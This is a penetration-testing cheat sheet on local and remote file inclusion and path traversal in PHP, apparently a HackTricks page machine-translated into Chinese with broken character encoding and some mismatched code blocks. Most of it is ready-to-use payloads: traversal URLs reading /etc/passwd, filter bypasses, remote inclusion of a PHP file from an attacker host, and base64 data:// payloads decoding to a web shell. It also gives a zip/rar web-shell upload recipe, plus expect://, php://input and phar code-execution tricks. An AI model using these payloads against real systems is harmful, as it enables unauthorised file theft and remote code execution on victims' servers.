# æ–‡ä»¶åŒ…å«/è·¯å¾„éå†

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ç›´åˆ°æˆä¸ºè‹±é›„ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWSçº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœä½ æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°ä½ çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

åŠ å…¥[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œæ¼æ´èµé‡‘çŒäººäº¤æµï¼

**é»‘å®¢æ´å¯Ÿ**\
å‚ä¸æ·±å…¥æ¢è®¨é»‘å®¢æ”»å‡»çš„åˆºæ¿€å’ŒæŒ‘æˆ˜çš„å†…å®¹

**å®æ—¶é»‘å®¢æ–°é—»**\
é€šè¿‡å®æ—¶æ–°é—»å’Œæ´å¯Ÿï¼Œè·Ÿä¸Šå¿«èŠ‚å¥çš„é»‘å®¢ä¸–ç•Œ

**æœ€æ–°å…¬å‘Š**\
é€šè¿‡æœ€æ–°çš„æ¼æ´èµé‡‘å‘å¸ƒå’Œå…³é”®å¹³å°æ›´æ–°ï¼Œä¿æŒä¿¡æ¯çš„æ›´æ–°

**åŠ å…¥æˆ‘ä»¬çš„** [**Discord**](https://discord.com/invite/N3FrSbmwdy) å¹¶å¼€å§‹ä¸é¡¶å°–é»‘å®¢åˆä½œï¼

## æ–‡ä»¶åŒ…å«

**è¿œç¨‹æ–‡ä»¶åŒ…å« (RFI)ï¼š** æ–‡ä»¶ä»è¿œç¨‹æœåŠ¡å™¨åŠ è½½ï¼ˆæœ€ä½³ï¼šä½ å¯ä»¥ç¼–å†™ä»£ç ï¼ŒæœåŠ¡å™¨å°†æ‰§è¡Œå®ƒï¼‰ã€‚åœ¨phpä¸­ï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯**ç¦ç”¨**çš„ï¼ˆ**allow\_url\_include**ï¼‰ã€‚\
**æœ¬åœ°æ–‡ä»¶åŒ…å« (LFI)ï¼š** æœåŠ¡å™¨åŠ è½½æœ¬åœ°æ–‡ä»¶ã€‚

å½“ç”¨æˆ·èƒ½å¤Ÿä»¥æŸç§æ–¹å¼æ§åˆ¶æœåŠ¡å™¨å³å°†åŠ è½½çš„æ–‡ä»¶æ—¶ï¼Œå°±ä¼šå‘ç”Ÿæ¼æ´ã€‚

æ˜“å—æ”»å‡»çš„**PHPå‡½æ•°**ï¼šrequire, require\_once, include, include\_once

ä¸€ä¸ªæœ‰è¶£çš„å·¥å…·æ¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼š[https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## ç›²ç›® - æœ‰è¶£ - LFI2RCEæ–‡ä»¶
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**å°†å‡ ä¸ªä¸åŒçš„ \*nix LFI åˆ—è¡¨æ··åˆå¹¶æ·»åŠ äº†æ›´å¤šè·¯å¾„ï¼Œæˆ‘åˆ›å»ºäº†ä»¥ä¸‹è¿™ä¸ªåˆ—è¡¨ï¼š**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

å°è¯•å°† `/` æ›´æ”¹ä¸º `\`\
ä¹Ÿå°è¯•æ·»åŠ  `../../../../../`

ä¸€ä¸ªä½¿ç”¨å¤šç§æŠ€æœ¯æ¥æŸ¥æ‰¾æ–‡ä»¶ /etc/passwordï¼ˆä»¥æ£€æŸ¥æ¼æ´æ˜¯å¦å­˜åœ¨ï¼‰çš„åˆ—è¡¨å¯ä»¥åœ¨[è¿™é‡Œ](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)æ‰¾åˆ°

### **Windows**

åˆå¹¶äº†å‡ ä¸ªåˆ—è¡¨åï¼Œæˆ‘åˆ›å»ºäº†ï¼š

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

å°è¯•å°† `/` æ›´æ”¹ä¸º `\`\
ä¹Ÿå°è¯•ç§»é™¤ `C:/` å¹¶æ·»åŠ  `../../../../../`

ä¸€ä¸ªä½¿ç”¨å¤šç§æŠ€æœ¯æ¥æŸ¥æ‰¾æ–‡ä»¶ /boot.iniï¼ˆä»¥æ£€æŸ¥æ¼æ´æ˜¯å¦å­˜åœ¨ï¼‰çš„åˆ—è¡¨å¯ä»¥åœ¨[è¿™é‡Œ](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)æ‰¾åˆ°

### **OS X**

æ£€æŸ¥ Linux çš„ LFI åˆ—è¡¨ã€‚

## åŸºç¡€ LFI åŠå…¶ç»•è¿‡

æ‰€æœ‰ç¤ºä¾‹éƒ½é€‚ç”¨äºæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼Œä½†ä¹Ÿå¯ä»¥åº”ç”¨äºè¿œç¨‹æ–‡ä»¶åŒ…å«ï¼ˆä¾‹å¦‚ page=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/ï¼‰ã€‚
```
http://example.com/index.php?page=../../../etc/passwd
```
### éå†åºåˆ—éé€’å½’åœ°è¢«å‰¥ç¦»
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **ç©ºå­—èŠ‚ (%00)**

ç»•è¿‡åœ¨æä¾›çš„å­—ç¬¦ä¸²æœ«å°¾é™„åŠ æ›´å¤šå­—ç¬¦ï¼ˆç»•è¿‡ï¼š$\_GET\['param']."php"ï¼‰
```
http://example.com/index.php?page=../../../etc/passwd%00
```
è¿™ä¸ªé—®é¢˜åœ¨ **PHP 5.4** å·²ç»å¾—åˆ°è§£å†³

### **ç¼–ç **

ä½ å¯ä»¥ä½¿ç”¨éæ ‡å‡†ç¼–ç ï¼Œæ¯”å¦‚åŒé‡URLç¼–ç ï¼ˆä»¥åŠå…¶ä»–ï¼‰ï¼š
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### æ¥è‡ªç°æœ‰æ–‡ä»¶å¤¹

åç«¯å¯èƒ½æ­£åœ¨æ£€æŸ¥æ–‡ä»¶å¤¹è·¯å¾„ï¼š
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### è¯†åˆ«æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶å¤¹

æ ¹æ®åº”ç”¨ç¨‹åºä»£ç /å…è®¸çš„å­—ç¬¦ï¼Œå¯èƒ½å¯ä»¥é€šè¿‡å‘ç°æ–‡ä»¶å¤¹è€Œä¸ä»…ä»…æ˜¯æ–‡ä»¶æ¥é€’å½’åœ°æ¢ç´¢æ–‡ä»¶ç³»ç»Ÿã€‚ä¸ºæ­¤ï¼š

* é€šè¿‡æˆåŠŸæ£€ç´¢ `/etc/passwd`ï¼ˆå¦‚æœåœ¨Linuxä¸Šï¼‰æ¥ç¡®å®šå½“å‰ç›®å½•çš„â€œæ·±åº¦â€ï¼š
```
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
* å°è¯•é€šè¿‡æ·»åŠ æ–‡ä»¶å¤¹åç§°ï¼ˆæ­¤å¤„ä¸º `private`ï¼‰ï¼Œç„¶åè¿”å›åˆ° `/etc/passwd` æ¥çŒœæµ‹å½“å‰ç›®å½•ä¸­çš„æ–‡ä»¶å¤¹åç§°ï¼š
```
http://example.com/index.php?page=private/../../../../etc/passwd # we went deeper down one level, so we have to go 3+1=4 levels up to go back to /etc/passwd
```
* å¦‚æœåº”ç”¨ç¨‹åºå­˜åœ¨æ¼æ´ï¼Œå¯èƒ½ä¼šæœ‰ä¸¤ç§ä¸åŒçš„è¯·æ±‚ç»“æœï¼š
* å¦‚æœä½ æ”¶åˆ°ä¸€ä¸ªé”™è¯¯/æ²¡æœ‰è¾“å‡ºï¼Œé‚£ä¹ˆ`private`æ–‡ä»¶å¤¹åœ¨è¿™ä¸ªä½ç½®ä¸å­˜åœ¨
* å¦‚æœä½ å¾—åˆ°äº†`/etc/passwd`çš„å†…å®¹ï¼Œä½ å°±éªŒè¯äº†å½“å‰ç›®å½•ç¡®å®å­˜åœ¨ä¸€ä¸ª`private`æ–‡ä»¶å¤¹
* ä½¿ç”¨è¿™ç§æŠ€æœ¯å‘ç°çš„æ–‡ä»¶å¤¹å¯ä»¥è¿›ä¸€æ­¥ä½¿ç”¨ç»å…¸çš„LFIæ–¹æ³•å¯¹æ–‡ä»¶è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ï¼Œæˆ–è€…ä½¿ç”¨ç›¸åŒçš„æŠ€æœ¯é€’å½’åœ°å¯¹å­ç›®å½•è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ã€‚

å¯ä»¥è°ƒæ•´è¿™ç§æŠ€æœ¯ï¼Œä»¥åœ¨æ–‡ä»¶ç³»ç»Ÿçš„ä»»ä½•ä½ç½®æ‰¾åˆ°ç›®å½•ã€‚ä¾‹å¦‚ï¼Œå¦‚æœåœ¨ç›¸åŒçš„å‡è®¾ä¸‹ï¼ˆå½“å‰ç›®å½•åœ¨æ–‡ä»¶ç³»ç»Ÿçš„ç¬¬ä¸‰å±‚ï¼‰ï¼Œä½ æƒ³æ£€æŸ¥`/var/www/`æ˜¯å¦åŒ…å«ä¸€ä¸ª`private`ç›®å½•ï¼Œä½¿ç”¨ä»¥ä¸‹payloadï¼š
```
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
ä»¥ä¸‹å‘½ä»¤åºåˆ—å…è®¸ä½¿ç”¨ `sed` (1) ç”Ÿæˆæœ‰æ•ˆè½½è·ï¼Œä½œä¸ºURLæ¨¡ç³Šæµ‹è¯•å·¥å…·å¦‚ `ffuf` (2) çš„è¾“å…¥ï¼š
```
$ sed 's_^_../../../var/www/_g' /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt | sed 's_$_/../../../etc/passwd_g' > payloads.txt
$ ffuf -u http://example.com/index.php?page=FUZZ -w payloads.txt -mr "root"
$ ffuf -u http://owasp.ctf.intigriti.io/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -e '.php~,.php.old,.php.bak,.php.swp,.php.sav,.php.save'
```
å½“ç„¶ï¼Œæ ¹æ®æ‚¨çš„éœ€æ±‚è°ƒæ•´è¿™äº›æœ‰æ•ˆè½½è·ï¼Œä»¥é€‚åº”æ·±åº¦/ä½ç½®/è¾“å…¥ç›®å½•åˆ—è¡¨ã€‚

### **è·¯å¾„æˆªæ–­**

ç»•è¿‡åœ¨æä¾›çš„å­—ç¬¦ä¸²æœ«å°¾é™„åŠ æ›´å¤šå­—ç¬¦çš„é™åˆ¶ï¼ˆç»•è¿‡ï¼š$\_GET\['param']."php"ï¼‰
```
In PHP: /etc/passwd = /etc//passwd = /etc/./passwd = /etc/passwd/ = /etc/passwd/.
Check if last 6 chars are passwd --> passwd/
Check if last 4 chars are ".php" --> shellcode.php/.
```

```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.

#With the next options, by trial and error, you have to discover how many "../" are needed to delete the appended string but not "/etc/passwd" (near 2027)

http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
å§‹ç»ˆå°è¯•**ä»å‡ç›®å½•**ï¼ˆa/ï¼‰**å¼€å§‹**è·¯å¾„ã€‚

**æ­¤æ¼æ´åœ¨PHP 5.3ä¸­å¾—åˆ°ä¿®æ­£ã€‚**

### **è¿‡æ»¤å™¨ç»•è¿‡æŠ€å·§**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## è¿œç¨‹æ–‡ä»¶åŒ…å«

åœ¨phpä¸­ï¼Œè¿™æ˜¯é»˜è®¤ç¦ç”¨çš„ï¼Œå› ä¸º **`allow_url_include`** æ˜¯**å…³é—­çš„**ã€‚å®ƒå¿…é¡»æ˜¯**å¼€å¯çš„**æ‰èƒ½å·¥ä½œï¼Œåœ¨é‚£ç§æƒ…å†µä¸‹ï¼Œä½ å¯ä»¥åŒ…å«æ¥è‡ªä½ æœåŠ¡å™¨çš„PHPæ–‡ä»¶å¹¶è·å¾—RCEï¼š
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
å¦‚æœå‡ºäºæŸç§åŸå›  **`allow_url_include`** æ˜¯ **å¼€å¯** çš„ï¼Œä½†PHPæ­£åœ¨**è¿‡æ»¤**å¯¹å¤–éƒ¨ç½‘é¡µçš„è®¿é—®ï¼Œ[æ ¹æ®è¿™ç¯‡æ–‡ç« ](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/)ï¼Œä½ å¯ä»¥ä½¿ç”¨æ•°æ®åè®®ä¸base64æ¥è§£ç b64 PHPä»£ç å¹¶è·å¾—RCEï¼š

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
åœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼Œæœ€åæ·»åŠ äº† `+.txt` æ˜¯å› ä¸ºæ”»å‡»è€…éœ€è¦ä¸€ä¸ªä»¥ `.txt` ç»“å°¾çš„å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å­—ç¬¦ä¸²ä»¥å®ƒç»“æŸï¼Œåœ¨ b64 è§£ç åé‚£éƒ¨åˆ†å°†è¿”å›æ— ç”¨ä¿¡æ¯ï¼Œè€ŒçœŸæ­£çš„ PHP ä»£ç å°†è¢«åŒ…å«ï¼ˆå› æ­¤ï¼Œè¢«æ‰§è¡Œï¼‰ã€‚
{% endhint %}

å¦ä¸€ä¸ª**ä¸ä½¿ç”¨ `php://` åè®®**çš„ä¾‹å­æ˜¯ï¼š

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Python æ ¹å…ƒç´ 

åœ¨ Python ä¸­ï¼Œåƒè¿™æ ·çš„ä»£ç ï¼š
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
å¦‚æœç”¨æˆ·ä¼ é€’äº†ä¸€ä¸ª**ç»å¯¹è·¯å¾„**åˆ° **`file_name`**ï¼Œ**ä¹‹å‰çš„è·¯å¾„å°†è¢«ç§»é™¤**ï¼š
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
```markdown
æ ¹æ®[å®˜æ–¹æ–‡æ¡£](https://docs.python.org/3.10/library/os.path.html#os.path.join)æ‰€è¿°ï¼Œè¿™æ˜¯é¢„æœŸçš„è¡Œä¸ºï¼š

> å¦‚æœç»„ä»¶æ˜¯ä¸€ä¸ªç»å¯¹è·¯å¾„ï¼Œé‚£ä¹ˆæ‰€æœ‰ä¹‹å‰çš„ç»„ä»¶éƒ½ä¼šè¢«ä¸¢å¼ƒï¼Œè¿æ¥æ“ä½œå°†ä»ç»å¯¹è·¯å¾„ç»„ä»¶å¼€å§‹ã€‚

## Java åˆ—å‡ºç›®å½•

çœ‹èµ·æ¥å¦‚æœä½ åœ¨ Java ä¸­é‡åˆ°è·¯å¾„éå†ï¼Œå¹¶ä¸”ä½ **è¯·æ±‚ç›®å½•**è€Œä¸æ˜¯æ–‡ä»¶ï¼Œä¼šè¿”å›**ç›®å½•åˆ—è¡¨**ã€‚æ®æˆ‘æ‰€çŸ¥ï¼Œå…¶ä»–è¯­è¨€ä¸ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µã€‚

## å‰25ä¸ªå‚æ•°

ä»¥ä¸‹æ˜¯å¯èƒ½å®¹æ˜“å—åˆ°æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFIï¼‰æ¼æ´å½±å“çš„å‰25ä¸ªå‚æ•°åˆ—è¡¨ï¼ˆæ¥æºäº[é“¾æ¥](https://twitter.com/trbughunters/status/1279768631845494787)ï¼‰ï¼š
```
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI ä½¿ç”¨ PHP åŒ…è£…å™¨å’Œåè®®

### php://filter

PHP è¿‡æ»¤å™¨å…è®¸åœ¨æ•°æ®è¢«è¯»å–æˆ–å†™å…¥ä¹‹å‰æ‰§è¡ŒåŸºæœ¬çš„**ä¿®æ”¹æ“ä½œ**ã€‚æœ‰ 5 ç±»è¿‡æ»¤å™¨ï¼š

* [å­—ç¬¦ä¸²è¿‡æ»¤å™¨](https://www.php.net/manual/en/filters.string.php)ï¼š
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`ï¼šä»æ•°æ®ä¸­ç§»é™¤æ ‡ç­¾ï¼ˆ"<" å’Œ ">" å­—ç¬¦ä¹‹é—´çš„æ‰€æœ‰å†…å®¹ï¼‰
* æ³¨æ„è¿™ä¸ªè¿‡æ»¤å™¨åœ¨ PHP çš„ç°ä»£ç‰ˆæœ¬ä¸­å·²ç»æ¶ˆå¤±
* [è½¬æ¢è¿‡æ»¤å™¨](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` ï¼šè½¬æ¢ä¸ºä¸åŒçš„ç¼–ç ï¼ˆ`convert.iconv.<input_enc>.<output_enc>`ï¼‰ã€‚è¦è·å–**æ‰€æœ‰æ”¯æŒçš„ç¼–ç åˆ—è¡¨**ï¼Œåœ¨æ§åˆ¶å°è¿è¡Œï¼š`iconv -l`

{% hint style="warning" %}
æ»¥ç”¨ `convert.iconv.*` è½¬æ¢è¿‡æ»¤å™¨ï¼Œä½ å¯ä»¥**ç”Ÿæˆä»»æ„æ–‡æœ¬**ï¼Œè¿™å¯èƒ½æœ‰åŠ©äºå†™å…¥ä»»æ„æ–‡æœ¬æˆ–ä½¿åƒ include è¿™æ ·çš„å‡½æ•°å¤„ç†ä»»æ„æ–‡æœ¬ã€‚æ›´å¤šä¿¡æ¯è¯·æŸ¥çœ‹ [**LFI2RCE é€šè¿‡ php è¿‡æ»¤å™¨**](lfi2rce-via-php-filters.md)ã€‚
{% endhint %}

* [å‹ç¼©è¿‡æ»¤å™¨](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`ï¼šå‹ç¼©å†…å®¹ï¼ˆå¦‚æœæ³„éœ²å¤§é‡ä¿¡æ¯æ—¶å¾ˆæœ‰ç”¨ï¼‰
* `zlib.inflate`ï¼šè§£å‹æ•°æ®
* [åŠ å¯†è¿‡æ»¤å™¨](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` ï¼šå·²å¼ƒç”¨
* `mdecrypt.*` ï¼šå·²å¼ƒç”¨
* å…¶ä»–è¿‡æ»¤å™¨
* åœ¨ php ä¸­è¿è¡Œ `var_dump(stream_get_filters());` å¯ä»¥æ‰¾åˆ°ä¸€äº›**æ„å¤–çš„è¿‡æ»¤å™¨**ï¼š
* `consumed`
* `dechunk`ï¼šé€†è½¬ HTTP åˆ†å—ç¼–ç 
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,Â£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
éƒ¨åˆ† "php://filter" å¯¹å¤§å°å†™ä¸æ•æ„Ÿ
{% endhint %}

### php://fd

æ­¤å°è£…å™¨å…è®¸è®¿é—®è¿›ç¨‹å·²æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦ã€‚å¯èƒ½ç”¨äºæ³„éœ²å·²æ‰“å¼€æ–‡ä»¶çš„å†…å®¹ï¼š
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ **php://stdin, php://stdout å’Œ php://stderr** æ¥åˆ†åˆ«è®¿é—® **æ–‡ä»¶æè¿°ç¬¦ 0, 1 å’Œ 2**ï¼ˆä¸ç¡®å®šè¿™åœ¨æ”»å‡»ä¸­å¦‚ä½•æœ‰ç”¨ï¼‰

### zip:// å’Œ rar://

ä¸Šä¼ ä¸€ä¸ªåŒ…å« PHPShell çš„ Zip æˆ– Rar æ–‡ä»¶å¹¶è®¿é—®å®ƒã€‚\
ä¸ºäº†èƒ½å¤Ÿæ»¥ç”¨ rar åè®®ï¼Œå®ƒ**éœ€è¦è¢«ç‰¹åˆ«æ¿€æ´»**ã€‚
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
```markdown
è¶£äº‹ï¼šæ‚¨å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è§¦å‘ XSS å¹¶ç»•è¿‡ Chrome Auditorï¼š `http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+`

è¯·æ³¨æ„ï¼Œæ­¤åè®®å— php é…ç½® **`allow_url_open`** å’Œ **`allow_url_include`** çš„é™åˆ¶

### expect://

Expect å¿…é¡»è¢«æ¿€æ´»ã€‚æ‚¨å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ‰§è¡Œä»£ç ã€‚
```
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### è¾“å…¥ï¼š

åœ¨POSTå‚æ•°ä¸­æŒ‡å®šä½ çš„æœ‰æ•ˆè½½è·
```
http://example.com/index.php?page=php://input
POST DATA: <?php system('id'); ?>
```
### phar://

`.phar` æ–‡ä»¶ä¹Ÿå¯ä»¥ç”¨æ¥æ‰§è¡Œ PHP ä»£ç ï¼Œå¦‚æœç½‘ç«™ä½¿ç”¨äº†åƒ `include` è¿™æ ·çš„å‡½æ•°æ¥åŠ è½½æ–‡ä»¶çš„è¯ã€‚

{% code title="create_phar.php" %}
```python
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');

$phar->stopBuffering();
```
```
{% endcode %}

æ‚¨å¯ä»¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ¥ç¼–è¯‘`phar`ï¼š
```
```bash
php --define phar.readonly=0 create_path.php
```
å°†ç”Ÿæˆä¸€ä¸ªåä¸º `test.phar` çš„æ–‡ä»¶ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å®ƒæ¥æ»¥ç”¨ LFIã€‚

å¦‚æœ LFI åªæ˜¯è¯»å–æ–‡ä»¶è€Œä¸æ‰§è¡Œå…¶ä¸­çš„ php ä»£ç ï¼Œä¾‹å¦‚ä½¿ç”¨å‡½æ•° _**file\_get\_contents(), fopen(), file() æˆ– file\_exists(), md5\_file(), filemtime() æˆ– filesize()**_**ã€‚** æ‚¨å¯ä»¥å°è¯•æ»¥ç”¨åœ¨ä½¿ç”¨ **phar** åè®®**è¯»å–**æ–‡ä»¶æ—¶å‘ç”Ÿçš„**ååºåˆ—åŒ–**ã€‚\
æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·é˜…è¯»ä»¥ä¸‹å¸–å­ï¼š

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### æ›´å¤šåè®®

æŸ¥çœ‹æ›´å¤šå¯èƒ½çš„[**åŒ…å«è¿™é‡Œçš„åè®®**](https://www.php.net/manual/en/wrappers.php)**ï¼š**

* [php://memory å’Œ php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) â€” åœ¨å†…å­˜æˆ–ä¸´æ—¶æ–‡ä»¶ä¸­å†™å…¥ï¼ˆä¸ç¡®å®šè¿™åœ¨æ–‡ä»¶åŒ…å«æ”»å‡»ä¸­å¦‚ä½•æœ‰ç”¨ï¼‰
* [file://](https://www.php.net/manual/en/wrappers.file.php) â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ
* [http://](https://www.php.net/manual/en/wrappers.http.php) â€” è®¿é—® HTTP(s) URLs
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) â€” è®¿é—® FTP(s) URLs
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) â€” å‹ç¼©æµ
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) â€” æŸ¥æ‰¾åŒ¹é…æ¨¡å¼çš„è·¯å¾„åï¼ˆå®ƒä¸è¿”å›ä»»ä½•å¯æ‰“å°çš„å†…å®¹ï¼Œæ‰€ä»¥è¿™é‡Œä¸çœŸæ­£æœ‰ç”¨ï¼‰
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) â€” å®‰å…¨å¤–å£³åè®® 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) â€” éŸ³é¢‘æµï¼ˆä¸é€‚ç”¨äºè¯»å–ä»»æ„æ–‡ä»¶ï¼‰

